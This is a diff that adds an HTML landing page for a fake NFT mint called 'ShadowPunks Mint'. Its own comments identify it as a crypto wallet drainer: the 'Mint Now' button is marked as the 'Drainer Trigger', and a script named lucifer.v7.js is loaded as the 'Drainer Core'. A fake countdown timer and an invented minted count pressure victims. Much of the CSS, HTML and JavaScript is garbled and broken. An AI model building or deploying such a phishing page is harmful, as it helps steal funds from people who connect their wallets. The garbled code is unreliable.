@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale0">
+    <title>ShadowPunks Mint | Exclusive NFT Collection</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --card: #1a;
+            --accent: #6e45e2;
+            --accent-glow: #8a2be2;
+        }
+        body {
+            background-color: var(--bg);
+            color: white;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-image: radial-gradient(circle at 10% 20%, rgba(110, 69, 226, 0.1) 0%, transparent 30%);
+        }
+        .container {
+            max-width: 1000px: 90%;
+            text-align: center;
+            padding: 2rem 0;
+        }
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 1.5rem;
+            background: linear-gradient(135deg, #6e45e2, #88dce);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: bold;
+            color: white;
+            box-shadow: 0 0 30px rgba(110, 69, 226, 0.3);
+        }
+        h1 {
+            font-size: ;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(90deg, #6e45e2, #88d3ce);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .subtitle {
+            font-size: 1.1rem;
+            color: #aaa;
+            margin-bottom: 2rem;
+        }
+        .mint-color: var(--card);
+            border-radius: 20px;
+            padding: 2rem;
+            margin: 2rem auto;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .-status {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+            color: #bbb;
+        }
+        .progress-bar {
+            height: 8px;
+            background-color: #333;
+            border-radius: 4px;
+            margin-bottom: 1.5rem;
+            overflow: hidden;
+        }
+        .: 100%;
+            background: linear-gradient(90deg, #6e45e2, #88d3ce);
+            width: 65%;
+            border-radius: 4px;
+        }
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            font-size: 1.5rem;
+        }
+        .countdown-item {
+            background: var(--card);
+            padding: 0.8rem 1.2rem;
+            border-radius: 10px;
+            min-width: 60px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        .mint-btn {
+            background: linear-gradient(90deg, #6e45e2, #ce);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(110, 226, 0.4);
+        }
+        .mint-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(110, 69, 226, 0.6);
+        }
+        .socials {
+            margin-top: 2rem;
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+        }
+        .socials a {
+            coloraaa;
+            font-size: 1.5rem;
+            transition: color 0.3s;
+        }
+        .socials a:hover {
+            color: var(--accent);
+        }
+        .footer {
+            margin-top: 3rem;
+            font-size: 0.8rem;
+            color: #666;
+        }
+        .interactBtn {
+            /* This class is REQUIRED for the drain work */
+            /* Do NOT remove */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">SP</div>
+        <h1>ShadowPunks Mint</h1>
+        <p class="subtitle">Exclusive NFT collection. Only 10,000 unique ShadowPunks will ever exist.</p>
+
+="mint-card">
+            <div class="mint-status">
+                <span>Minted: <strong>6,500 / 10,000</strong></span>
+                <span>Price: <strong>0.08 ETH</strong></span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div class="countdown">
+                <div class="countdown-item"><span id="days">02</span><br><small>Days</small></div>
+                <div class="countdown-item"><span id="hours">15</span><br><small>Hours</small></div>
+                <div class="countdown-item"><span id="minutes">45</span><Minutes</small></div>
+                <div class="countdown-item"><span id="seconds">30</span><br><small>Seconds</small></div>
+            </div>
+
+            <!-- Drainer Trigger Button - MUST have interactBtn class -->
+            <button class="mint-btn interactBtn">Mint Now</button>
+
+            <p style="margin-top: 1rem; font-size: 0.9rem;;">Connect your wallet to mint. Gas fees apply.</p>
+        </div>
+
+        <div class="socials">
+            <a href="#" target="_blank">🐦</a>
+            <a href="#" target="_blank">💬</a>
+            <a href="#" target="_blank">📱</a>
+        </div>
+
+        <div class="footer">
+ 2025 ShadowPunks. All rights reserved.
+        </div>
+    </div>
+
+    <!-- Drainer Core - DO NOT MODIFY -->
+    <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
+
+    <!-- Fake Countdown Timer -->
+    <script>
+        function updateCountdown() {
+            const days = document.getElementById('days');
+            const hoursById('hours');
+            const minutes = document.getElementById('minutes');
+            const seconds = document.getElementById('seconds');
+
+            let s = parseInt(seconds.innerText);
+            s--;
+            if (s < 0) {
+                s = 59;
+                let m = parseInt(minutes.innerText);
+                m--;
+                if (m < 0) {
+                    m = 59;
+                    let h = parseInt(hours.innerText);
+                    hh < 0) {
+                        h = 23;
+                        let d = parseInt(days.innerText);
+                        d--;
+                        if (d < 0) d = 0;
+                        days.innerText = d.toString().padStart(2, '0');
+                    }
+                    hours.innerText = h.toString().padStart(2, '0');
+                }
+                minutes.innerText = m.toString().padStart(2, '0');
+            }
+            seconds.toString().padStart(2, '0');
+        }
+        setInterval(updateCountdown, 1000);
+    </script>
+</body>
+</html>
